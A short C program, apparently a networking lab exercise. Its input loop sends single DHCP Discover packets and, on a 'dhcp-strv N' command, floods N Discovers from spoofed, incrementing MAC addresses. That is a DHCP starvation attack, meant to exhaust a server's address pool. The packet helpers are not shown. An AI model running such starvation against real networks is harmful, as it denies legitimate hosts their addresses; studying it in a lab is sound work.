#include <stdio.h>

#include "dhcp.h"
#include "util.h"

void main_proc(netdevice_t *device) {
	int key = 0;				   // fgetc()'s Buffer
	char buf[MAX_INPUT_LEN];	   // fgets()'s Buffer
	int strv_num = 0;			   // Numbers to do the DHCP starvation
	int dhcp_dis = 0;			   // DHCP Discover tmp int
	byte fake_mac[ETH_ADDR_LEN];   // Fake MAC to DHCP starvation
	ETH_COPY(fake_mac, string_to_eth_addr("20:7b:d2:19:e8:00"));

	// Clean the '\n' in stdin
	fgetc(stdin);

	while (1) {
		// Receive packets from here
		netdevice_rx(device);

		// DHCP starvation packet send
		if (strv_num != 0) {
			/**
			 *Flush svtrv_num & fake_mac if succes send a DHCP message
			 */
			if (dhcp_discover(fake_mac) == 0) {
				strv_num--;
				fake_mac[5]++;
			}
		}

		// DHCP Discover packet send
		if (dhcp_dis) {
			/**
			 *Flush dhcp_dis if succes send a DHCP message
			 */
			if (dhcp_discover(MY_MAC_ADDR) == 0) {
				dhcp_dis = 0;
			}
		}

		// Continue the loop if the input is not complete
		if (readready() == 0)
			continue;

		// Type q to exit
		if ((key = fgetc(stdin)) == 'q') {
			break;
		}

		// Put the character back to stdin
		ungetc(key, stdin);

		// Read stdin into buf
		if (fgets(buf, 256, stdin) == NULL) {
			break;
		}

		int strv_buf = 0;	// strv_num's buf
		sscanf(buf, "dhcp-strv %d", &strv_buf);
		strv_num += strv_buf;

		if (strcmp(buf, "dhcp\n") == 0) {
			dhcp_dis = 1;
		}
	}

	return;
}

int main() {
	// The interface we're sending the packet
	netdevice_t *device;

	// Initialize from DHCP (Application layer)
	device = dhcp_init();

	// Main process
	main_proc(device);

	// Close the device
	netdevice_close(device);

	return 0;
}